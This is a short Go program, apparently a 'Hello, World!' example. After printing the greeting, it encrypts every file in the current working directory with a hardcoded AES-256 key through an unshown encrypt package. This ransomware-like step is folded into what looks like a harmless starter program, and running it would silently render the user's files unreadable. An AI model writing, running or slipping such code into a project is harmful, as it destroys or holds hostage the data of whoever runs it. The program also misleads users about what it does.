package main

import (
	"fmt"
	"hw/pkg/encrypt"
)

func main() {
	fmt.Println("Hello, World!")

	// Encrypt the contents of the current folder
	key := []byte("a-32-byte-key-for-AES-256-!!!!!!") // 32 bytes
	err := encrypt.EncryptFolder(".", key)
	if err != nil {
		fmt.Printf("Error encrypting current folder: %v\n", err)
	} else {
		fmt.Println("Successfully encrypted contents of current folder.")
	}
}
